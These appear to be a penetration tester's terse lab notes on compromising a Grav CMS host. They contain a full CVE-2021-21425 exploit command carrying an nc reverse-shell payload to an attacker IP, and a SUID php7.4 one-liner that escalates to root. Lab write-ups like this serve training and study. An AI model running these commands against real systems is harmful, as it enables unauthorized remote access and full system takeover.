ports 22 and 80 open
port 80 looks like a work in progress
dirsearch and all, nothing much
grav cms --> searchsploit shows a few authenticated rces and one unauthenticated file write. but it uses msfconsole. CVE-2021-21425
There's a python exploit https://github.com/CsEnox/CVE-2021-21425/blob/main/exploit.py
`python grav_cms_exploit.py -c 'mkfifo /tmp/f; nc 192.168.45.168 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm tmp/f' -t http://192.168.246.12/grav-admin`
www-data!

---
php7.4 had suid set
after a bunch of methods listed in gtfo bins, the 4th one worked
`php7.4 -r 'pcntl_exec("/bin/sh", ["-p"]);`
root!